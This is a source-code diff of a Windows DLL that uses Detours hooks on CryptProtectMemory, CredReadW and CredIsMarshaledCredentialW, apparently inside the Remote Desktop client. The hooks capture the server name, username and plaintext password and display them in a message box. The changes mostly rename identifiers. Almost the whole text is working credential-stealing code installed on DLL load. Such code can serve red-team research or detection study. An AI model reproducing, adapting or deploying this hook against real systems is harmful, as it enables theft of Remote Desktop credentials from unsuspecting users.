@@ -14,16 +14,16 @@ LPCWSTR lpUsername = NULL;
 LPCWSTR lpTempPassword = NULL;
 
 //original signatures
-typedef DPAPI_IMP  BOOL(WINAPI* OriginalCryptProtectMemory1)(LPVOID pDataIn, DWORD  cbDataIn, DWORD  dwFlags);
+typedef DPAPI_IMP  BOOL(WINAPI* originalCryptProtectMemoryType)(LPVOID pDataIn, DWORD  cbDataIn, DWORD  dwFlags);
 
-static BOOL(WINAPI* OriginalCredIsMarshaledCredentialW)(LPCWSTR MarshaledCredential) = CredIsMarshaledCredentialW;
-static BOOL(WINAPI* OriginalCredReadW)(LPCWSTR targetName, DWORD type, DWORD flags, PCREDENTIALW *credential) = CredReadW;
+static BOOL(WINAPI* originalCredIsMarshaledCredentialW)(LPCWSTR MarshaledCredential) = CredIsMarshaledCredentialW;
+static BOOL(WINAPI* originalCredReadW)(LPCWSTR targetName, DWORD type, DWORD flags, PCREDENTIALW *credential) = CredReadW;
 
 //Load Library Dynamically by MSTSC.exe
-static OriginalCryptProtectMemory1  OriginalCryptProtectMemory = (OriginalCryptProtectMemory1)GetProcAddress(GetModuleHandleW(L"crypt32.dll"), "CryptProtectMemory");
+static originalCryptProtectMemoryType  originalCryptProtectMemory = (originalCryptProtectMemoryType)GetProcAddress(GetModuleHandleW(L"crypt32.dll"), "CryptProtectMemory");
 
 
-DWORD WINAPI CreateMessageBox(LPCWSTR lpParam) {
+DWORD WINAPI createMessageBox(LPCWSTR lpParam) {
     MessageBox(NULL, lpParam, L"Dll says:", MB_OK);
     return 0;
 }
@@ -33,15 +33,15 @@ VOID displayCredentials() {
     WCHAR  DataBuffer[cbBuffer];
     memset(DataBuffer, 0x00, cbBuffer);
     StringCbPrintf(DataBuffer, cbBuffer, L"Server: %s Username: %s Password: %s", lpServer, lpUsername, lpTempPassword);
-    CreateMessageBox(DataBuffer);
+    createMessageBox(DataBuffer);
 }
 
-BOOL  _CredReadW(LPCWSTR targetName, DWORD type, DWORD flags, PCREDENTIALW* credential) {
+BOOL  _credReadW(LPCWSTR targetName, DWORD type, DWORD flags, PCREDENTIALW* credential) {
     lpServer = targetName;
-    return OriginalCredReadW(targetName, type, flags, credential);
+    return originalCredReadW(targetName, type, flags, credential);
 }
 
-BOOL _CryptProtectMemory(LPVOID pDataIn, DWORD  cbDataIn, DWORD  dwFlags) {
+BOOL _cryptProtectMemory(LPVOID pDataIn, DWORD  cbDataIn, DWORD  dwFlags) {
 
     DWORD cbPass = 0;
     LPVOID lpPassword;
@@ -57,16 +57,16 @@ BOOL _CryptProtectMemory(LPVOID pDataIn, DWORD  cbDataIn, DWORD  dwFlags) {
         lpTempPassword = (LPCWSTR)lpPassword;
     }
 
-    return OriginalCryptProtectMemory(pDataIn, cbDataIn, dwFlags);
+    return originalCryptProtectMemory(pDataIn, cbDataIn, dwFlags);
 }
 
-BOOL  _CredIsMarshaledCredentialW(LPCWSTR MarshaledCredential) {
+BOOL  _credIsMarshaledCredentialW(LPCWSTR MarshaledCredential) {
 
     lpUsername = MarshaledCredential;
 
     displayCredentials();
 
-    return OriginalCredIsMarshaledCredentialW(MarshaledCredential);
+    return originalCredIsMarshaledCredentialW(MarshaledCredential);
 }
 
 void attachDetour() {
@@ -75,9 +75,9 @@ void attachDetour() {
     DetourTransactionBegin();
     DetourUpdateThread(GetCurrentThread());
 
-    DetourAttach((PVOID*)&OriginalCryptProtectMemory, _CryptProtectMemory);
-    DetourAttach((PVOID*)&OriginalCredIsMarshaledCredentialW, _CredIsMarshaledCredentialW);
-    DetourAttach((PVOID*)&OriginalCredReadW, _CredReadW);
+    DetourAttach((PVOID*)&originalCryptProtectMemory, _cryptProtectMemory);
+    DetourAttach((PVOID*)&originalCredIsMarshaledCredentialW, _credIsMarshaledCredentialW);
+    DetourAttach((PVOID*)&originalCredReadW, _credReadW);
 
     DetourTransactionCommit();
 }
@@ -87,9 +87,9 @@ void deAttachDetour() {
     DetourTransactionBegin();
     DetourUpdateThread(GetCurrentThread());
 
-    DetourDetach(&(PVOID&)OriginalCryptProtectMemory, _CryptProtectMemory);
-    DetourDetach(&(PVOID&)OriginalCredIsMarshaledCredentialW, _CredIsMarshaledCredentialW);
-    DetourDetach(&(PVOID&)OriginalCredReadW, _CredReadW);
+    DetourDetach(&(PVOID&)originalCryptProtectMemory, _cryptProtectMemory);
+    DetourDetach(&(PVOID&)originalCredIsMarshaledCredentialW, _credIsMarshaledCredentialW);
+    DetourDetach(&(PVOID&)originalCredReadW, _credReadW);
 
     DetourTransactionCommit();
 }
@@ -108,11 +108,6 @@ BOOL APIENTRY DllMain( HMODULE hModule,
     {
     case DLL_PROCESS_ATTACH: 
         attachDetour();
-        break;
-    case DLL_THREAD_ATTACH:
-       
-        break;
-    case DLL_THREAD_DETACH:
         break;
     case DLL_PROCESS_DETACH:
         deAttachDetour();
